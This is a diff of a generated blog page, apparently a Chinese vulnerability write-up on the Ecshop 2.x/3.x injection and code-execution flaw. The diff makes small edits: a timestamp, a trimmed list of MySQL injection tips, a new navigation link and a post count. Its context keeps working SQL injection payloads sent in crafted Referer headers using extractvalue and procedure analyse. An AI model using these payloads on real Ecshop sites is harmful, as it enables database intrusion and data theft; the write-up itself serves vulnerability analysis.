@@ -96,7 +96,7 @@
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180907/09JabDCCDd.png?imageslim">
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180907/3Gfcibd25b.png?imageslim">
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180907/h09955h7Dg.png?imageslim">
-<meta property="og:updated_time" content="2018-09-07T10:48:47.801Z">
+<meta property="og:updated_time" content="2018-09-11T16:39:09.290Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Ecshop2.x&amp;3.x最新漏洞分析与利用">
 <meta name="twitter:description" content="Ecshop2.x &amp;amp; 3.x版本最新注入与代码执行漏洞分析与利用序在九月份初左右爆出了一个有关Ecshop全版本的通杀漏洞，据说攻击者之前使用该漏洞的payload去攻击了某区块链交易所网站。该漏洞最早由知道创宇404积极防御团队通过知道创宇旗下云防御产品“创宇盾”在2018年6月13日拦截并捕获，然后到了9月份漏洞的详情和攻击payload才公开出来，期间应该有不少应用都受到了该漏洞的">
@@ -374,10 +374,9 @@ Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:72:&quot
 <p><strong>首先是<code>$arr[&#39;id&#39;]</code>这个位置，关于这个位置无需多说，使用正常的报错注入方法就行，构造payload</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180907/KKie54eEAF.png?imageslim" alt="mark"><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Referer: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">"name"</span>;i:<span class="number">1</span>;s:<span class="number">2</span>:<span class="string">"id"</span>;s:<span class="number">49</span>:<span class="string">"' and extractvalue(1,concat(0x3a,user(),0x3a))-- "</span>;&#125;</div></pre></td></tr></table></figure></p>
 <p><strong>可以看到成功报错出了数据库的信息</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180907/5chd4eG8Lc.png?imageslim" alt="mark"></p>
 <p><strong>接下来是<code>$arr[&#39;num&#39;]</code>这个位置的注入，这个位置的注入比较特殊，因为它在limit的后面，因为mysql的语法规则，在limit后面只能使用<code>procedure analyse</code>这个函数去进行报错注入，并且有很多的局限性，以后自己会单独写一篇文章总结，下面先来简单说一下有关这个函数的使用</strong></p>
-<pre><code>1.limit必须和order by一起使用时才能使用procedure analyse这个函数去进行报错
-2.该函数的参数为两个，并且只有两个参数时才能报错，两个参数的位置均可以报错
-3.使用updatexml，extractvalue等报错函数报错查询数据时，不能在报错函数内使用select关键字查询数据
-4.可以时间盲注，但是不能使用sleep函数，但是可以使用benchmark函数取替代sleep
+<pre><code>1.该函数的参数为两个，并且只有两个参数时才能报错，两个参数的位置均可以报错
+2.使用updatexml，extractvalue等报错函数报错查询数据时，不能在报错函数内使用select关键字查询数据
+3.可以时间盲注，但是不能使用sleep函数，但是可以使用benchmark函数取替代sleep
 </code></pre><p><strong>报错注入利用</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180907/iAl82c7LgF.png?imageslim" alt="mark"><br><strong>时间盲注利用</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180907/09JabDCCDd.png?imageslim" alt="mark"><br><strong>构造payload</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180907/3Gfcibd25b.png?imageslim" alt="mark"><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Referer: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">"num"</span>;s:<span class="number">63</span>:<span class="string">"0,1 procedure analyse(extractvalue(1,concat(0x3a,user())),1)-- "</span>;s:<span class="number">2</span>:<span class="string">"id"</span>;i:<span class="number">1</span>;&#125;</div></pre></td></tr></table></figure></p>
 <p><img src="http://p008biu9n.bkt.clouddn.com/blog/180907/h09955h7Dg.png?imageslim" alt="mark"></p>
 
@@ -419,6 +418,10 @@ Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:72:&quot
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/08/记一次ctf极限利用-不包含数字字母的webshell/" rel="prev" title="记一次ctf极限利用-不包含数字字母的webshell">
+                记一次ctf极限利用-不包含数字字母的webshell <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -499,7 +502,7 @@ Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:72:&quot
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">50</span>
+                  <span class="site-state-item-count">51</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
